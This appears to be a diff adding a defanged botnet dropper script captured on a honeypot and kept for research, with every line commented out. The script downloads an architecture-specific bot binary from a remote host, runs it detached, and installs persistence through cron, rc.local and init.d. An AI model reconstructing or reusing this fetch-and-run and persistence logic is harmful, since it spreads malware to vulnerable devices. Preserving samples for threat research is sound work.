@@ -1,0 +1,99 @@
+# ============================================================================
+# DEFANGED FOR RESEARCH - DO NOT RUN. Every line of the original is commented
+# out and network indicators are defanged (hxxp, [.]).
+# Original: persist.sh version 2, 3380 bytes
+# SHA-256:  659742f14304f2ec1cf1ec34833b93002cd360835fff3073d19ea2edf23d6bea
+# Captured: KSI Digital Cowrie honeypot, served from hxxp://89.163.157[.]131:8080/persist.sh
+# ============================================================================
+
+# #!/bin/sh
+# # ancient telnet persistence payload - PURE ASCII ONLY.
+# # old busybox shells choke on multi-byte UTF-8, so no em-dashes, no box chars.
+# #
+# # served at hxxp://89.163.157[.]131:8080/persist.sh
+#
+# HOST=89.163.157[.]131
+# PORT=8080
+#
+# ARCH=`uname -m 2>/dev/null`
+# case "$ARCH" in
+#     aarch64|arm64|armv8*|armv9*)   BIN=arm8   ;;
+#     armv7*|armv7l)                 BIN=arm7   ;;
+#     armv6*|armv6l)                 BIN=arm6   ;;
+#     armv5*|armv5l|armv5tejl)       BIN=arm5   ;;
+#     armv4*|armv4l)                 BIN=arm4   ;;
+#     mips64el|mips64*)              BIN=mips   ;;
+#     mipsel|mips*el*)               BIN=mpsl   ;;
+#     mips)                          BIN=mips   ;;
+#     x86_64|amd64)                  BIN=x86_64 ;;
+#     i386|i486|i586|i686|x86|ia32)  BIN=x86    ;;
+#     m68k)                          BIN=m68k   ;;
+#     ppc64|ppc|powerpc*)            BIN=ppc    ;;
+#     sh4|sh)                        BIN=sh4    ;;
+#     *)                             BIN=x86_64 ;;
+# esac
+#
+# URL="hxxp://$HOST:$PORT/$BIN"
+#
+# # try each writable dir until one holds a real binary
+# for DIR in /data /etc /mnt/mtd /cache /var/tmp /tmp /dev/shm /root /; do
+#     [ -w "$DIR" ] || continue
+#     cd "$DIR" 2>/dev/null || continue
+#     OUT="$DIR/.ancient"
+#     rm -f "$OUT" 2>/dev/null
+#
+#     wget "$URL" -O "$OUT" 2>/dev/null
+#     [ -s "$OUT" ] || busybox wget "$URL" -O "$OUT" 2>/dev/null
+#     [ -s "$OUT" ] || curl "$URL" -o "$OUT" 2>/dev/null
+#     [ -s "$OUT" ] || busybox curl "$URL" -o "$OUT" 2>/dev/null
+#     [ -s "$OUT" ] || toybox wget "$URL" -O "$OUT" 2>/dev/null
+#
+#     SZ=`wc -c < "$OUT" 2>/dev/null`
+#     [ -z "$SZ" ] && SZ=0
+#
+#     if [ "$SZ" -gt 100000 ]; then
+#         chmod 777 "$OUT" 2>/dev/null
+#
+#         # ALREADY RUNNING? never launch a second copy. re-running the payload
+#         # (scanner re-hits, cron, rc.local) must not spawn duplicate instances
+#         # that all connect and make the C2 thrash closing same-IP connections.
+#         if ps w 2>/dev/null | grep -v grep | grep -q "\.ancient"; then
+#             echo "ANCIENT_STARTED $BIN $SZ already_running"
+#             exit 0
+#         fi
+#         if command -v pgrep >/dev/null 2>&1 && pgrep -f "\.ancient" >/dev/null 2>&1; then
+#             echo "ANCIENT_STARTED $BIN $SZ already_running"
+#             exit 0
+#         fi
+#
+#         # launch detached so it survives the telnet session closing (SIGHUP).
+#         # setsid if present, else nohup, else plain.
+#         if command -v setsid >/dev/null 2>&1; then
+#             setsid "$OUT" >/dev/null 2>&1 &
+#         elif command -v nohup >/dev/null 2>&1; then
+#             nohup "$OUT" >/dev/null 2>&1 &
+#         else
+#             "$OUT" >/dev/null 2>&1 &
+#         fi
+#
+#         # reboot persistence
+#         (crontab -l 2>/dev/null; echo "*/5 * * * * $OUT") | crontab - 2>/dev/null
+#         echo "$OUT" >> /etc/rc.local 2>/dev/null
+#         printf '#!/bin/sh\n%s\n' "$OUT" > /etc/init.d/.ancient 2>/dev/null
+#         chmod 755 /etc/init.d/.ancient 2>/dev/null
+#
+#         # VERIFY: did the bot actually connect to the C2?
+#         # 35342 = 0x8A0E, /proc/net/tcp shows ports little-endian as :0E8A
+#         sleep 5
+#         if cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | grep -q ":0E8A"; then
+#             echo "ANCIENT_STARTED $BIN $SZ connected"
+#         else
+#             echo "ANCIENT_NOCONN $BIN $SZ launched_but_not_connected"
+#         fi
+#         exit 0
+#     fi
+#     rm -f "$OUT" 2>/dev/null
+# done
+#
+# echo "ANCIENT_FAIL no_binary"
+# exit 0
